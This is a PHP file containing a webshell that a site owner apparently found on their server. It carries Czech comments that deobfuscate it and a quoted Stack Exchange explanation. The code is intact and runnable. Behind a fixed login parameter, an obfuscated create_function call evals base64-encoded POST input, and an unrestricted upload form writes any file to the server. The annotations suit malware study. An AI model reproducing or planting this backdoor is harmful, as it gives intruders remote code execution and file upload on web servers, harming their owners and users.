<?php 

// neprisel jsem na to, jak se mi toto na server dostalo, stranka pouze vypisuje udaje z textovych souboru
// a nepracuje s zadnym vstupem uzivatele (var.1: utokem na jiny web; var.2: problemem serveru) 

if($_GET["login"]=="iOfG2Y"){
  $or="JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg";  
  $zs="KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym"; 
  $lq="FzZTY0X2RlY29kZSgkX1BPU1RbJ3owJ10pO"; 
  $bu="yBAxZXZhbCgiXCRzYWZlZGcgPSAkeHNzZXI7Iik7IH0="; 
  $avj = str_replace("j","","sjtrj_jrjejpljajcje");  // ->  str_replace 
  $qu = $avj("i", "", "ibiaisie6i4i_dieicoide");     // ->  base64_decode
  $fh = $avj("k","","crkekatkek_kfkukncktkikon");    // ->  create_function
  $hwy = $fh("", $qu($avj("x", "", $or.$zs.$lq.$bu)));   
    // ->  create_function( "", base64_decode( str_replace( "x", "", $or.$zs.$lq.$bu ) ) )
    // tj:  create_function( "", base64_decode( JG11amogPSAkX1BPU1RbJ3onXTsgaWYgKCRtdWpqIT0iIikgeyAkeHNzZXI9YmFzZTY0X2RlY29kZSgkX1BPU1RbJ3owJ10pOyBAZXZhbCgiXCRzYWZlZGcgPSAkeHNzZXI7Iik7IH0= ) )
    // tj:  create_function( "", $mujj = $_POST['z']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); } )
    // tj: $mujj = $_POST['z']; 
    //     if ($mujj!="") { 
    //          $xsser=base64_decode($_POST['z0']); 
    //          @eval("\$safedg = $xsser;"); 
    //     }

/*
Vysvetleni z webu:
https://security.stackexchange.com/questions/97647/what-is-this-url-injection-piece-of-code-mean

User: user45139 (THX)

I searched further about your issue and I found that an attacker used an opensource webshell application to execute shell on your server in a variety of common scripting languages such as ASP,ASPX,PHP,JSP,PL and Python.

A quick study of that script lead me to know that:

$mujj = $_POST['x']; 
    if ($mujj!="") { 

This checks the password (password to something) carried in the variable x is not empty (which thing you can translate by: when the user logs in)

$xsser=base64_decode($_POST['z0']);

Decode the content of the z0 variable and save it in $xsser. Actually z0 refers to a file (you are likely to allow file upload on your web application? or may be this malicious application allows file upload -which thing is logic too-?)

@eval("\$safedg = $xsser;");

The content saved in $xsser is then executed (dangerous operation) on your server.

*/

    
                          
  $hwy(); 
  $target_path=basename($_FILES["uploadedfile"]["name"]);
  if(move_uploaded_file($_FILES["uploadedfile"]["tmp_name"],$target_path)){
      echo basename($_FILES["uploadedfile"]["name"])." has been uploaded";
  } else { 
      echo "Uploader By Psyco!"; 
  }
} 

?>

<form enctype="multipart/form-data" method="POST">
  <input name="uploadedfile" type="file"/>
  <input type="submit" value="Upload File"/>
</form>